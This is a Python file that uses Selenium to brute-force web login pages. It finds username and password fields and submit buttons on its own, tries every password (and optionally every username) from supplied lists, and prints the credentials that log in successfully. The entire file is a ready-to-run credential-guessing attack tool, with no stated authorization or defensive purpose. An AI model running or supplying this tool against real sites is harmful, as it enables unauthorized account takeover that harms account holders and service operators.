from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

def find_login_fields(driver):
    """
    Auto-detect username and password input fields on the page.
    Return (username_field, password_field) or (None, None) if not found.
    """
    password_fields = driver.find_elements(By.XPATH, "//input[@type='password']")
    if not password_fields:
        return None, None
    password_field = password_fields[0]
    # Try to find username field before password field in DOM
    all_inputs = driver.find_elements(By.XPATH, "//input")
    username_field = None
    for i, el in enumerate(all_inputs):
        if el == password_field and i > 0:
            # Search backwards for likely username field
            for j in range(i-1, -1, -1):
                t = all_inputs[j].get_attribute("type")
                if t in ["text", "email"]:
                    username_field = all_inputs[j]
                    break
            break
    return username_field, password_field

def find_all_login_field_combinations(driver):
    """
    Find all possible (username/email, password) field pairs on the page.
    Return a list of (username_field, password_field) tuples.
    """
    password_fields = driver.find_elements(By.XPATH, "//input[@type='password']")
    if not password_fields:
        return []
    all_inputs = driver.find_elements(By.XPATH, "//input")
    username_candidates = []
    for el in all_inputs:
        t = (el.get_attribute("type") or "").lower()
        n = (el.get_attribute("name") or "").lower()
        i = (el.get_attribute("id") or "").lower()
        p = (el.get_attribute("placeholder") or "").lower()
        a = (el.get_attribute("aria-label") or "").lower()
        # Check for common username/email keywords
        if (
            t in ["text", "email"] or
            any(k in n for k in ["user", "email", "login", "account"]) or
            any(k in i for k in ["user", "email", "login", "account"]) or
            any(k in p for k in ["user", "email", "login", "account"]) or
            any(k in a for k in ["user", "email", "login", "account"])
        ):
            username_candidates.append(el)
    combinations = []
    for pwd_field in password_fields:
        for uname_field in username_candidates:
            if uname_field != pwd_field:
                combinations.append((uname_field, pwd_field))
        # Also support password-only login
        combinations.append((None, pwd_field))
    return combinations

def brute_force(url, username, password_list, delay=2, success_url=None, verbose=True):
    """
    Try all passwords in password_list on the given url with the given username.
    If username is None, only fill password field.
    If username is a list or generator, try each username with all passwords (fixed password if password_list is a single string).
    Auto-detects login fields. Stops when login is successful.
    """
    driver = webdriver.Chrome()  # You need to have chromedriver in PATH
    driver.get(url)
    # If username is iterable (not str/None), try all usernames
    if username is not None and not isinstance(username, str):
        for uname in username:
            for pwd in password_list:
                if verbose:
                    print(f"Trying username: {uname} password: {pwd}")
                driver.get(url)
                time.sleep(1)
                username_field, password_field = find_login_fields(driver)
                if not password_field:
                    print("Could not find password field.")
                    break
                if username_field:
                    username_field.clear()
                    username_field.send_keys(uname)
                password_field.clear()
                password_field.send_keys(pwd)
                # Fully automatic submit button detection and click
                try:
                    # Collect all candidate submit buttons
                    candidates = []
                    # All <button> elements
                    candidates += driver.find_elements(By.TAG_NAME, 'button')
                    # All <input type=submit>
                    candidates += driver.find_elements(By.XPATH, "//input[@type='submit']")
                    # Filter: if any candidate has value, aria-label, id, class containing submit/login
                    filtered = []
                    for el in candidates:
                        try:
                            v = (el.get_attribute('value') or '').lower()
                            a = (el.get_attribute('aria-label') or '').lower()
                            i = (el.get_attribute('id') or '').lower()
                            c = (el.get_attribute('class') or '').lower()
                            t = (el.text or '').lower()
                            if any(x in v for x in ['submit','login']) or any(x in a for x in ['submit','login']) or any(x in i for x in ['submit','login']) or any(x in c for x in ['submit','login']) or any(x in t for x in ['submit','login']):
                                filtered.append(el)
                        except Exception:
                            continue
                    # If filtered found, try them first
                    clicked = False
                    for el in filtered + [e for e in candidates if e not in filtered]:
                        try:
                            el.click()
                            clicked = True
                            break
                        except Exception:
                            continue
                    if not clicked:
                        # Fallback: send Enter key
                        password_field.send_keys(Keys.RETURN)
                except Exception:
                    password_field.send_keys(Keys.RETURN)
                time.sleep(delay)
                if success_url:
                    if driver.current_url.startswith(success_url):
                        print(f"Login success! Username: {uname} Password: {pwd}")
                        driver.quit()
                        return (uname, pwd)
                else:
                    # Only check if URL changed or generic error message (no Chinese)
                    if url not in driver.current_url:
                        print(f"Login success! Username: {uname} Password: {pwd}")
                        driver.quit()
                        return (uname, pwd)
        print("All username/password combinations tried, none succeeded.")
        driver.quit()
        return None
    # Default: username is str or None, password_list is iterable
    for pwd in password_list:
        if verbose:
            print(f"Trying password: {pwd}")
        driver.get(url)
        time.sleep(1)
        username_field, password_field = find_login_fields(driver)
        if not password_field:
            print("Could not find password field.")
            break
        if username_field and username is not None:
            username_field.clear()
            username_field.send_keys(username)
        password_field.clear()
        password_field.send_keys(pwd)
        # --- First try to submit by pressing Enter ---
        password_field.send_keys(Keys.RETURN)
        time.sleep(1)  # Wait a bit to see if Enter works
        # Check if login was successful or page changed
        login_success = False
        if success_url:
            if driver.current_url.startswith(success_url):
                print(f"Login success! Username: {username} Password: {pwd}")
                driver.quit()
                return pwd
        else:
            # Only check if URL changed or generic error message (no Chinese)
            if url not in driver.current_url:
                print(f"Login success! Username: {username} Password: {pwd}")
                driver.quit()
                return pwd
        # --- If not successful, try to auto-detect and click submit/login buttons ---
        try:
            # Collect all candidate submit buttons
            candidates = []
            # All <button> elements
            candidates += driver.find_elements(By.TAG_NAME, 'button')
            # All <input type=submit>
            candidates += driver.find_elements(By.XPATH, "//input[@type='submit']")
            # Filter: if any candidate has value, aria-label, id, class, or text containing submit/login
            filtered = []
            for el in candidates:
                try:
                    v = (el.get_attribute('value') or '').lower()
                    a = (el.get_attribute('aria-label') or '').lower()
                    i = (el.get_attribute('id') or '').lower()
                    c = (el.get_attribute('class') or '').lower()
                    t = (el.text or '').lower()
                    if any(x in v for x in ['submit','login']) or any(x in a for x in ['submit','login']) or any(x in i for x in ['submit','login']) or any(x in c for x in ['submit','login']) or any(x in t for x in ['submit','login']):
                        filtered.append(el)
                except Exception:
                    continue
            # If filtered found, try them first
            clicked = False
            for el in filtered + [e for e in candidates if e not in filtered]:
                try:
                    el.click()
                    clicked = True
                    break
                except Exception:
                    continue
        except Exception:
            pass
        time.sleep(delay)
        # Check again if login was successful after clicking buttons
        if success_url:
            if driver.current_url.startswith(success_url):
                print(f"Login success! Username: {username} Password: {pwd}")
                driver.quit()
                return pwd
        else:
            # Only check if URL changed or generic error message (no Chinese)
            if url not in driver.current_url:
                print(f"Login success! Username: {username} Password: {pwd}")
                driver.quit()
                return pwd
    print("All passwords tried, none succeeded.")
    driver.quit()
    return None